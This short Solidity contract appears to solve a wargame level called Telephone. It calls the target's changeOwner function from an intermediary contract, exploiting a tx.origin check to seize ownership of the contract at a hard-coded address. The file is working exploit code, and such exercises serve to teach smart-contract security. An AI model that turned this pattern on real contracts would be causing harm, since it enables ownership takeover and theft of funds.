// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    Telephone public telephone =
        Telephone(0x989fF40fd96aB438fd8078C1fec45E6De6F9D37E);

    function hackChangeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
